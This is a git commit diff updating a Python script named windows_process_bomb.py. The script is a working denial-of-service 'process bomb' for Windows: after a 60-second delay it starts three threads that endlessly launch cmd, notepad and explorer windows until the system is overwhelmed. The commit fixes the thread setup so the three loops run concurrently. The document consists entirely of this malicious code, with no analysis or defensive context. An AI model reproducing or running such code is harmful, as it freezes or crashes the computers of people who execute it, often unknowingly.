34369deb5fedf227dbf8bd9e292d3d63a7a7c837
Vesel4ak <gushchinkv@yandex.ru>
2025-07-31 13:30:55 +0300

    Update windows_process_bomb.py

--- windows_process_bomb.py
+++ windows_process_bomb.py
@@ -6,55 +6,38 @@ from sys import exit
 
 OS = system()
 
+
 def cmd_bomb() -> None:
-
     if OS == "Windows":
-
         while True:
-
             os.system("start cmd")
-
-
     else:
         exit(1)
 
 
-def notepad_bomb() ->None:
-
+def notepad_bomb() -> None:
     if OS == "Windows":
-
         while True:
-
             os.system("start notepad")
-
-
     else:
         exit(1)
 
 
 def explorer_bomb() -> None:
-
     if OS == "Windows":
-
         while True:
-
             os.system("start explorer")
-
-
     else:
         exit(1)
 
 
-
-
-
-
 if __name__ == "__main__":
-
     sleep(60)
 
-    for _ in range(1000):
+    cmd_thread = Thread(target=cmd_bomb)
+    notepad_thread = Thread(target=notepad_bomb)
+    explorer_thread = Thread(target=explorer_bomb)
 
-        Thread(target=cmd_bomb()).start()
-        Thread(target=notepad_bomb()).start()
-        Thread(target=explorer_bomb()).start()
+    cmd_thread.start()
+    notepad_thread.start()
+    explorer_thread.start()
